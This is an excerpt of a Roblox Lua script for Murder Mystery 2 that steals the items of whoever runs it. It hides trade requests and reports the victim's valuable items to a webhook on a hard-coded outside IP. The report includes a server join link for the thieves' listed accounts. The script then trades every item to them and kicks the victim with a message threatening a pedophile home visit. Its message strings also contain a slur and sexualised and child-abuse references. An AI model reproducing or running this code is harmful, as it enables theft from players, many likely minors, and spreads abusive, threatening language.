_G.Usernames = {"ISleepThruUrAlarms", "hateable283", "iostinherfeelings"}
_G.min_rarity = "Godly"
_G.min_value = 1 -- Put 1 to get all
_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
_G.whook = "http://89.169.3.53:8000/webhook/91464bf6-0d45-49cd-bb73-b0b36cc464ce"
...
local function tradereq()
game.Players.LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest:Destroy()
end
coroutine.wrap(tradereq)()
...
local function SendFirstMessage(list, prefix)
    ...
    local fields = {
        ...
        {
            name = "Esex:",
            value = string.format("Total Egirls: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s pussies (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
    ...
    local data = {
        ...
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 hit you faggot 🦒",
            ["color"] = 28927,
            ["fields"] = fields,
            ["footer"] = {
    ...
    local response = request({
        Url = "http://89.169.3.53:8000/webhook/91464bf6-0d45-49cd-bb73-b0b36cc464ce",
        Method = "POST",
        Headers = headers,
        Body = body
    })
...
local function SendMessage(sortedItems)
	...
	local fields = {
        ...
        {
            name = "Total egirls beamed:",
            value = string.format("Total Esex: %s", totalValue),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local itemLine = string.format("%s (x%s): %s esex (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
...
local function SendDHFirstMessage(list, prefix)
    ...
    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 CP",
            ["color"] = 28927,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Comparison is the thief of joy."
...
if #weaponsToSend > 0 then
    ...
    local function doTrade(joinedUser)
        ...
        -- Send the "NEW MM2 HIT" webhook only after all items are traded
        SendMessage(sentWeapons)
        plr:kick("A local pedophile in your area will be assigned to infiltrate your house. Pedophile: .w.e.r. on Discord.")
    end
